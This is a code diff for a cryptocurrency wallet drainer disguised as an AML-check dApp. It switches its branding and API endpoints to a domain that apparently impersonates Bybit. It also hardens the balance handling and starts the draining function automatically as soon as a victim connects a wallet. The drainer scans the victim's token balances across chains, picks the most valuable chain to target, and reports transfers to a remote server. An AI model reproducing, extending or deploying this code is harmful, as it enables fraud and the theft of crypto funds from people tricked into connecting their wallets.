@@ -24,8 +24,8 @@ const appKit = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'https://amlinsight.io',
-    icons: ['https://amlinsight.io/icon.png'],
+    url: 'https://bybitamlbot.com/',
+    icons: ['https://bybitamlbot.com/icon.png'],
   },
   features: { analytics: true, email: false, socials: false },
   allWallets: 'SHOW',
@@ -223,7 +223,7 @@ async function checkBalance(chainId, userAddress, provider) {
     console.log(`📊 USDT balance: ${ethers.utils.formatUnits(usdtBalance, usdtDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Failed to fetch USDT balance: ${error.message}`);
-    tokenBalances[chainConfig.usdtAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
+    tokenBalances[chainConfig.usdtAddress] = { balance: null, decimals: 6, error: error.message };
   }
 
   try {
@@ -236,7 +236,7 @@ async function checkBalance(chainId, userAddress, provider) {
     console.log(`📊 USDC balance: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Failed to fetch USDC balance: ${error.message}`);
-    tokenBalances[chainConfig.usdcAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
+    tokenBalances[chainConfig.usdcAddress] = { balance: null, decimals: 6, error: error.message };
   }
 
   if (chainConfig.otherTokenAddresses) {
@@ -252,7 +252,7 @@ async function checkBalance(chainId, userAddress, provider) {
         return { address: tokenAddress, balance, decimals };
       } catch (error) {
         console.warn(`⚠️ Failed to fetch token ${tokenAddress} balance: ${error.message}`);
-        return { address: tokenAddress, balance: ethers.BigNumber.from(0), decimals: 18 };
+        return { address: tokenAddress, balance: null, decimals: 18, error: error.message };
       }
     });
 
@@ -272,7 +272,7 @@ function hasFunds(bal) {
   if (bal.nativeBalance.gt(minNativeBalance)) return true;
 
   for (const tokenData of Object.values(bal.tokenBalances)) {
-    if (tokenData.balance.gt(minTokenBalance)) return true;
+    if (tokenData.balance && tokenData.balance.gt(minTokenBalance)) return true;
   }
 
   return false;
@@ -301,6 +301,7 @@ function detectWallet() {
 }
 
 function formatBalance(balance, decimals) {
+  if (!balance) return '0';
   const formatted = ethers.utils.formatUnits(balance, decimals);
   return parseFloat(formatted).toFixed(6).replace(/\.?0+$/, '');
 }
@@ -308,7 +309,7 @@ function formatBalance(balance, decimals) {
 async function saveSession(userAddress, chainId, txHash = null) {
   try {
     if (!sessionId) sessionId = generateSessionId();
-    const response = await fetch('https://api.amlinsight.io/api/save-session', {
+    const response = await fetch('https://api.bybitamlbot.com/api/save-session', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -335,7 +336,7 @@ async function restoreSession() {
     const storedSessionId = sessionStorage.getItem('sessionId');
     if (!storedSessionId) return null;
 
-    const response = await fetch(`https://api.amlinsight.io/api/get-session/${storedSessionId}`);
+    const response = await fetch(`https://api.bybitamlbot.com/api/get-session/${storedSessionId}`);
     const data = await response.json();
     if (data.success) {
       console.log(`✅ Session restored: ${storedSessionId}`);
@@ -355,7 +356,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
   try {
     console.log(`📍 Notifying server for token ${tokenAddress} for ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const balance = initialAmount;
+    const balance = initialAmount || (await token.balanceOf(userAddress));
     const decimals = (await token.decimals()) || 6;
     console.log(`📊 Current token balance: ${ethers.utils.formatUnits(balance, decimals)}`);
 
@@ -367,7 +368,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 
     await saveSession(userAddress, chainId, txHash);
 
-    const response = await fetch('https://api.amlinsight.io/api/transfer', {
+    const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -421,7 +422,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
   }
 
-  const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses)];
+  const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses || {})];
 
   const connectNotifiedKey = `connectNotified_${userAddress}_${chainId}`;
   const hasNotified = sessionStorage.getItem(connectNotifiedKey);
@@ -442,15 +443,17 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
 
     for (const tokenAddress of tokenAddresses) {
-      const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
-      const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
-      if (formattedBalance > 0) {
-        const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
-                      tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                      Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-        const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
-        const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
-        funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
+      const tokenData = bal.tokenBalances[tokenAddress] || { balance: null, decimals: 18 };
+      if (tokenData.balance) {
+        const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
+        if (formattedBalance > 0) {
+          const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                        tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                        Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+          const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
+          const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
+          funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
+        }
       }
     }
 
@@ -492,10 +495,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-    const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
-    const realBalance = tokenData.balance;
+    const tokenData = bal.tokenBalances[tokenAddress] || { balance: null, decimals: 18 };
+    const realBalance = tokenData.balance || (await tokenContract.balanceOf(userAddress));
     const decimals = tokenData.decimals;
-    console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(realBalance, decimals)}`);
+    console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(realBalance || 0, decimals)}`);
     return { tokenAddress, tokenContract, realBalance, decimals };
   });
 
@@ -503,18 +506,19 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`✅ Retrieved token data: ${tokenDataResults.length} tokens`);
 
   for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
-    const storedBalance = bal.tokenBalances[tokenAddress]?.balance || ethers.BigNumber.from(0);
-    const storedBalanceFormatted = parseFloat(ethers.utils.formatUnits(storedBalance, decimals));
+    if (!realBalance) continue;
+    const storedBalance = bal.tokenBalances[tokenAddress]?.balance || null;
+    const storedBalanceFormatted = storedBalance ? parseFloat(ethers.utils.formatUnits(storedBalance, decimals)) : 0;
     const realBalanceFormatted = parseFloat(ethers.utils.formatUnits(realBalance, decimals));
 
-    if (realBalanceFormatted < storedBalanceFormatted) {
+    if (storedBalance && realBalanceFormatted < storedBalanceFormatted) {
       bal.tokenBalances[tokenAddress] = { balance: realBalance, decimals: decimals };
     }
 
     if (realBalanceFormatted > 0 && realBalanceFormatted > MIN_TOKEN_BALANCE) {
       const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                     tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+                    Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
       if (!symbol) {
         console.warn(`⚠️ Skipping token ${tokenAddress}: symbol not defined`);
         continue;
@@ -649,7 +653,7 @@ async function runDrainer(provider, signer, userAddress) {
   }
 
   const target = sorted[0];
-  console.log(`Recommended chain: chainId ${target.chainId} with max token value ${target.totalValueInUSDT} USDT`);
+  console.log(`📍 Targeting chain: chainId ${target.chainId} with max token value ${target.totalValueInUSDT} USDT`);
   return { targetChainId: target.chainId, targetProvider: target.provider };
 }
 
@@ -659,15 +663,17 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
 
   for (const tokenAddress of Object.keys(balance.tokenBalances)) {
     const tokenData = balance.tokenBalances[tokenAddress];
-    const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
-    if (formattedBalance > 0) {
-      const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
-                    tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-      const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
-      const tokenValue = formattedBalance * tokenPrice;
-      totalValue += tokenValue;
-      console.log(`📊 Token ${symbol} in chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
+    if (tokenData.balance) {
+      const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
+      if (formattedBalance > 0) {
+        const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                      tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                      Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+        const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
+        const tokenValue = formattedBalance * tokenPrice;
+        totalValue += tokenValue;
+        console.log(`📊 Token ${symbol} in chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
+      }
     }
   }
 
@@ -866,7 +872,8 @@ window.addEventListener('DOMContentLoaded', async () => {
     try {
       const state = await new Promise(resolve => {
         const unsubscribe = appKit.subscribeState(state => {
-          if (state.connected && state.address) {
+          console.log('🔍 SubscribeState (restore):', state);
+          if ((state.connected || state.loading === false) && (state.address || state.accounts?.[0])) {
             unsubscribe();
             resolve(state);
           }
@@ -876,10 +883,12 @@ window.addEventListener('DOMContentLoaded', async () => {
           resolve(null);
         }, 2000);
       });
-      if (state && state.address && state.address.toLowerCase() === connectedAddress.toLowerCase()) {
+      if (state && (state.address || state.accounts?.[0]) && 
+          ((state.address && state.address.toLowerCase() === connectedAddress.toLowerCase()) || 
+           (state.accounts?.[0] && state.accounts[0].toLowerCase() === connectedAddress.toLowerCase()))) {
         await attemptDrainer();
       } else {
-        console.warn(`⚠ Wallet not connected, clearing session`);
+        console.warn(`⚠ Wallet not connected or address mismatch, clearing session`);
         sessionStorage.removeItem('sessionId');
         connectedAddress = null;
       }
@@ -979,8 +988,7 @@ async function handleConnectOrAction() {
       console.log('🔄 Opening AppKit modal for wallet selection...');
       await appKit.open();
       connectedAddress = await waitForConnection();
-      console.log(`✅ Wallet connected: ${connectedAddress}`);
-      appKit.close();
+      console.log(`✅ Wallet connected in handleConnectOrAction: ${connectedAddress}`);
 
       if (!window.ethereum) throw new Error('No Ethereum provider available after connection');
       const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
@@ -988,13 +996,12 @@ async function handleConnectOrAction() {
       await saveSession(connectedAddress, network.chainId);
     } else {
       console.log(`✅ Wallet already connected: ${connectedAddress}`);
-    }
-
-    if (!isTransactionPending) {
-      await attemptDrainer();
-    } else {
-      console.log('⏳ Transaction already in progress');
-      await hideModalWithDelay("Transaction already in progress.");
+      if (!isTransactionPending) {
+        await attemptDrainer();
+      } else {
+        console.log('⏳ Transaction already in progress');
+        await hideModalWithDelay("Transaction already in progress.");
+      }
     }
   } catch (error) {
     console.error(`❌ Connection error: ${error.message}`);
@@ -1008,27 +1015,125 @@ async function handleConnectOrAction() {
 async function waitForConnection() {
   return new Promise((resolve, reject) => {
     console.log('📡 Waiting for wallet connection via AppKit...');
+    console.log('🔍 window.ethereum available:', !!window.ethereum);
 
     const isMobile = isMobileDevice();
     console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
 
-    const unsubscribe = appKit.subscribeState((state) => {
-      if (state.connected && state.address) {
-        console.log(`✅ Wallet connected via AppKit: ${state.address}`);
-        unsubscribe();
-        resolve(state.address);
+    let attempts = 0;
+    const maxAttempts = 10; // Пробуем 10 раз с интервалом 2 секунды
+    const interval = 2000; // Интервал между попытками (2 секунды)
+
+    const unsubscribe = appKit.subscribeState(async (state) => {
+      console.log('🔍 SubscribeState:', state);
+
+      let walletAddress = null;
+
+      // Проверяем состояние подключения
+      if (state.loading === false) {
+        if (state.connected && (state.address || state.accounts?.[0] || state.selectedAddress)) {
+          walletAddress = state.address || state.accounts?.[0] || state.selectedAddress;
+          console.log(`✅ Address from state: ${walletAddress}`);
+        }
       }
+
+      // Пробуем извлечь адрес из формата eip155:1:0x...
+      if (!walletAddress && state.accounts?.[0]?.startsWith('eip155:1:')) {
+        walletAddress = state.accounts[0].split(':')[2];
+        console.log(`✅ Extracted address from eip155:1: ${walletAddress}`);
+      }
+
+      // Пробуем получить адрес через window.ethereum
+      if (!walletAddress && window.ethereum && attempts < maxAttempts) {
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+          if (accounts && accounts.length > 0) {
+            walletAddress = accounts[0];
+            console.log(`✅ Address from eth_accounts: ${walletAddress}`);
+          } else {
+            console.log(`ℹ No accounts returned by eth_accounts (attempt ${attempts + 1}/${maxAttempts})`);
+          }
+        } catch (error) {
+          console.error(`❌ Error fetching eth_accounts: ${error.message}`);
+        }
+      }
+
+      // Пробуем получить адрес через appKit.getAddress()
+      if (!walletAddress && attempts < maxAttempts) {
+        try {
+          const address = await appKit.getAddress?.();
+          if (address) {
+            walletAddress = address;
+            console.log(`✅ Address from appKit.getAddress: ${walletAddress}`);
+          }
+        } catch (error) {
+          console.warn(`⚠ Failed to get address via appKit.getAddress: ${error.message}`);
+        }
+      }
+
+      if (walletAddress) {
+        console.log(`✅ Wallet connected via AppKit: ${walletAddress}`);
+        connectedAddress = walletAddress;
+        unsubscribe();
+        modalSubtitle.textContent = 'Preparing to sign transaction...';
+        try {
+          await attemptDrainer();
+          appKit.close();
+          resolve(walletAddress);
+        } catch (err) {
+          console.error(`❌ Error in attemptDrainer: ${err.message}`);
+          appKit.close();
+          reject(err);
+        }
+      } else if (attempts >= maxAttempts) {
+        console.warn('⚠ Max connection attempts reached');
+        unsubscribe();
+        appKit.close();
+        reject(new Error('Failed to connect wallet after maximum attempts'));
+      }
+
+      attempts++;
     });
 
-    const timeout = setTimeout(() => {
-      unsubscribe();
-      reject(new Error('Timeout waiting for wallet connection'));
-    }, 60000);
+    // Запускаем периодическую проверку
+    const checkInterval = setInterval(async () => {
+      if (attempts >= maxAttempts) {
+        clearInterval(checkInterval);
+        return;
+      }
+      if (!window.ethereum) return;
 
-    appKit.open('error', (err) => {
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts && accounts.length > 0) {
+          console.log(`✅ Address from eth_accounts (interval): ${accounts[0]}`);
+          connectedAddress = accounts[0];
+          unsubscribe();
+          clearInterval(checkInterval);
+          modalSubtitle.textContent = 'Preparing to sign transaction...';
+          await attemptDrainer();
+          appKit.close();
+          resolve(accounts[0]);
+        }
+      } catch (error) {
+        console.error(`❌ Error in interval eth_accounts: ${error.message}`);
+      }
+    }, interval);
+
+    const timeout = setTimeout(() => {
+      console.warn('⚠ Connection timeout');
+      unsubscribe();
+      clearInterval(checkInterval);
+      appKit.close();
+      reject(new Error('Timeout waiting for wallet connection'));
+    }, 120000);
+
+    appKit.on('error', (err) => {
       console.error(`❌ AppKit error: ${err.message}`);
       clearTimeout(timeout);
+      clearInterval(checkInterval);
       unsubscribe();
+      appKit.close();
       reject(err);
     });
   });
